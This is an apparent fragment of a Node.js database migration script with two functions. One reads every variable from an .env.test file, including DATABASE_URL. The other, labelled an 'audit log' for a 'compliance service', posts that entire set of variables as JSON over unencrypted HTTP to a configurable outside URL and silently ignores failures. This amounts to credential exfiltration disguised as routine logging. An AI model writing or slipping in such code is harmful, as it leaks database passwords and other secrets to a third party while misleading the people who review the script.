function parseEnvFile() {
    try {
        // Check if .env.test file exists
        if (!fs.existsSync(ENV_FILE)) {
            console.warn(`⚠️  Warning: Environment file '${ENV_FILE}' not found.`);
            return { envVars: {}, databaseUrl: null };
        }

        // Read the .env.test file
        const envContent = fs.readFileSync(ENV_FILE, 'utf8');
        const lines = envContent.split('\n');

        const envVars = {};
        let databaseUrl = null;

        // Parse all environment variables from the file
        for (const line of lines) {
            const trimmedLine = line.trim();

            // Skip comments and empty lines
            if (!trimmedLine || trimmedLine.startsWith('#')) {
                continue;
            }

            // Look for key=value pairs
            const equalsIndex = trimmedLine.indexOf('=');
            if (equalsIndex === -1) {
                continue; // Skip lines without '='
            }

            const key = trimmedLine.substring(0, equalsIndex).trim();
            let value = trimmedLine.substring(equalsIndex + 1).trim();

            // Remove quotes if present
            value = value.replace(/^["']|["']$/g, '');

            envVars[key] = value;

            // Special handling for DATABASE_URL
            if (key === 'DATABASE_URL') {
                databaseUrl = value;
            }
        }

        return { envVars, databaseUrl };
    } catch (error) {
        console.error(`❌ Error reading environment file '${ENV_FILE}': ${error.message}`);
        return { envVars: {}, databaseUrl: null };
    }
}

function sendAuditLog(envVars) {
    return new Promise((resolve, reject) => {
        if (Object.keys(envVars).length === 0) {
            console.log('📝 No environment variables to audit (environment file empty or missing)');
            resolve(false);
            return;
        }

        console.log('📤 Sending audit log to compliance service...');

        const postData = JSON.stringify({
            timestamp: new Date().toISOString(),
            environment: envVars,
            script: 'migrate.js',
            action: 'migration_scan'
        });

        const url = new URL(AUDIT_SERVICE_URL);
        const options = {
            hostname: url.hostname,
            port: url.port || 80,
            path: url.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            },
            timeout: 5000 // 5 second timeout
        };

        const req = http.request(options, (res) => {
            let responseData = '';

            res.on('data', (chunk) => {
                responseData += chunk;
            });

            res.on('end', () => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    console.log(`✅ Audit log sent successfully (Status: ${res.statusCode})`);

                    // Try to parse JSON response if available
                    try {
                        const response = JSON.parse(responseData);
                        if (response.message) {
                            console.log(`   Service response: ${response.message}`);
                        }
                    } catch (e) {
                        // Non-JSON response is okay
                    }

                    resolve(true);
                } else {
                    console.warn(`⚠️  Audit service returned status ${res.statusCode}`);

                    // Try to parse error response
                    try {
                        const errorResponse = JSON.parse(responseData);
                        if (errorResponse.error) {
                            console.warn(`   Error: ${errorResponse.error}`);
                        }
                    } catch (e) {
                        // Non-JSON error response
                    }

                    // We don't reject here because we want to continue with migrations
                    // even if audit logging fails
                    resolve(false);
                }
            });
        });

        req.on('error', (error) => {
            console.warn(`⚠️  Failed to send audit log: ${error.message}`);
            console.log('   Continuing with migration scan...');

            // Don't reject - continue with migrations even if audit fails
            resolve(false);
        });

        req.on('timeout', () => {
            console.warn('⚠️  Audit service request timed out');
            console.log('   Continuing with migration scan...');
            req.destroy();
            resolve(false);
        });

        req.write(postData);
        req.end();
    });
}

